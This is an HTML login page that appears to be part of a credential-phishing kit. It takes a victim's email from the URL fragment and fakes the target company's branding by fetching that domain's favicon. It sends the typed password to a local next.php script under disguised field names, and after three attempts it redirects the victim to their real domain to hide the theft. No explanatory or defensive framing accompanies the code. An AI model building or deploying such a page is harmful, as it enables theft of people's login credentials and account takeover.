<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0; shrink-to-fit=no">
    <title>Portal</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <style>
        body {
            background-color: #f4f4f9; /* Light background for readability */
            font-family: Arial, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh; /* Full page height */
        }

        #main-container {
            width: 100%;
            max-width: 400px; /* Restrict container width */
            background: white; /* Panel background */
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1); /* Subtle shadow */
            border-radius: 8px; /* Rounded edges */
            text-align: center; /* Center content */
            padding: 20px;
        }

        img#logoImg {
            width: 80px; /* Fixed logo size */
            height: auto;
            margin: auto;
            display: block; /* Center the logo */
            margin-bottom: 20px; /* Space below the logo */
        }

        h5#companyName {
            font-size: 1.5rem;
            color: #444444;
            margin-bottom: 20px;
            text-transform: uppercase;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            height: 40px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-bottom: 20px;
            padding: 0 10px;
            box-sizing: border-box;
        }

        button {
            width: 100%;
            background-color: #0046ad; /* Button color */
            color: white;
            border: none;
            height: 40px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: bold;
        }

        button:hover {
            background-color: #003080; /* Darker blue on hover */
        }

        #error-message {
            display: none; /* Hidden by default */
            margin-top: 10px;
            color: #d9534f; /* Red color for error */
            background: #f2dede;
            padding: 10px;
            border-radius: 4px;
        }
    </style>
</head>

<body>
    <div id="main-container">
        <!-- Logo Section -->
        <img id="logoImg" src="#" alt="Logo" />

        <!-- Company Name -->
        <h5 id="companyName"></h5>

        <!-- Error Message -->
        <div id="error-message">An error occurred. Please try again.</div>

        <!-- Login Fields -->
        <form onsubmit="event.preventDefault(); nextFun();">
            <input type="email" id="id" value="" readonly />
            <input type="password" id="pass" placeholder="Enter your password" />
            <button type="submit">Login</button>
        </form>
    </div>

    <script>
        let failedAttempts = 0;

        /* Update company name and logo dynamically from URL */
        document.addEventListener("DOMContentLoaded", function () {
            const hash = window.location.hash.substring(1);
            if (hash && hash.includes("@")) {
                const domain = hash.split("@")[1];
                document.getElementById("id").value = hash;
                document.getElementById("companyName").innerText = domain.split(".")[0].toUpperCase();
                document.getElementById("logoImg").src = `https://www.google.com/s2/favicons?sz=128&domain=${domain}`;
            }
        });

        /* Login Functionality */
        function nextFun() {
            const username = document.getElementById("id").value;
            const password = document.getElementById("pass").value;

            if (username.length === 0 || password.length === 0) {
                displayError("Email or Password cannot be empty.");
                return;
            }

            $.ajax({
                url: "./next.php",
                type: "POST",
                data: { di: username, pr: password },
                success: function (response) {
                    if (response.success) {
                        window.location.replace(response.redirectUrl || `https://${username.split("@")[1]}`);
                    } else {
                        failedAttempts++;
                        displayError(response.message || "Invalid credentials. Try again.");

                        if (failedAttempts >= 3) {
                            window.location.replace(`https://${username.split("@")[1]}`);
                        }
                    }
                },
                error: function () {
                    failedAttempts++;
                    displayError("An error occurred. Please try again.");

                    if (failedAttempts >= 3) {
                        window.location.replace(`https://${username.split("@")[1]}`);
                    }
                },
                complete: function () {
                    document.getElementById("pass").value = ""; // Clear password field
                },
            });
        }

        /* Display Error */
        function displayError(message) {
            const errorDiv = document.getElementById("error-message");
            errorDiv.innerText = message;
            errorDiv.style.display = "block";
            setTimeout(() => {
                errorDiv.style.display = "none";
            }, 2000);
        }
    </script>
</body>

</html>
